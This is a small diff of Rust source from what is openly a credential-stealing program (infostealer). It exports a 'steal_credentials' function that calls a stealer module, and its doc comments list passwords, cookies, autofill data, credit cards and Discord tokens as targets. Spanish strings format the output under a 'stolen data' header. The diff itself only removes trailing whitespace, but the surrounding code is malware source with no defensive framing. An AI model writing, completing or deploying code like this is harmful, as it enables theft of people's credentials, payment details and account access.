@@ -49,7 +49,7 @@ mod stealer;
 ///
 /// Returns multi-line text with sections for:
 /// - Passwords
-/// - Cookies  
+/// - Cookies
 /// - Autofill data
 /// - Credit cards
 /// - Discord tokens
@@ -65,19 +65,19 @@ pub extern "C" fn steal_credentials() -> *mut c_char {
     let result = panic::catch_unwind(|| {
         // Ejecutar el stealer
         let stolen_data = stealer::steal_all();
-        
+
         if stolen_data.is_empty() {
             return CString::new("ERROR:No se encontraron credenciales").unwrap().into_raw();
         }
-        
+
         // Formatear datos
         let mut output = String::from("═══ DATOS ROBADOS ═══\n");
         output.push_str(&format!("Total: {} items encontrados\n", stolen_data.total_count()));
         output.push_str(&stolen_data.to_string());
-        
+
         CString::new(output).unwrap().into_raw()
     });
-    
+
     match result {
         Ok(ptr) => ptr,
         Err(_) => {
